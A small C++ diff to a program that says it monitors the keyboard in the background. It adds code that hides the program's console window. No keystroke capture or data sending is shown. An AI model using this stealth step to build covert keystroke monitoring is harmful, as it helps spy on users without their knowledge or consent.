@@ -25,6 +25,11 @@ public:
     {
         this->initConfig();
         std::cout << "Monitoring keyboard in the background. Press 'End' to exit.\n";
+
+        // Retrieves the handle of the current console window
+        HWND hwnd = GetConsoleWindow();
+        // Hides the window
+        ShowWindow(hwnd, SW_HIDE);
     }
 
     ~Application()
